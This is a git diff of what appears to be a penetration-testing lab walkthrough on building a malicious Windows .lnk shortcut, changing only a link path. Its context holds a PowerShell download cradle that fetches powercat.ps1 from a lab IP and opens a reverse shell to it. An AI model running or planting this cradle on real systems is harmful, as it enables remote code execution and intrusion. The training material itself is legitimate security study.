@@ -238,7 +238,7 @@ Reset the `tiddies.library-ms` file to its original state. Now, we're moving on 
 ### Creating the Shortcut File
 [.LNK](../../computers/windows/LNK.md) files (`.lnk`) are metadata files specific to [Windows](../../computers/windows/README.md) and can be interpreted by the Windows Shell. It's used primarily for creating link "shortcuts" to files and applications in the filesystem. 
 
-We can use a `.lnk` file to link to our exploit which will be another [powershell](../../computers/windows/powershell.md) [download cradle](../../cybersecurity/TTPs/actions-on-objective/download-cradles.md). Right click the Desktop and click New --> Shortcut. In the window that pops up, we're going to enter a *path to a program* as well as *arguments*. Let's use powershell as our program and a download cradle as our arguments. For reference, this will be our cradle:
+We can use a `.lnk` file to link to our exploit which will be another [powershell](../../coding/languages/powershell.md) [download cradle](../../cybersecurity/TTPs/actions-on-objective/download-cradles.md). Right click the Desktop and click New --> Shortcut. In the window that pops up, we're going to enter a *path to a program* as well as *arguments*. Let's use powershell as our program and a download cradle as our arguments. For reference, this will be our cradle:
 ```powershell
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.232:8000/powercat.ps1');powercat -c 192.168.45.232 -p 44444 -e powershell"
 ```
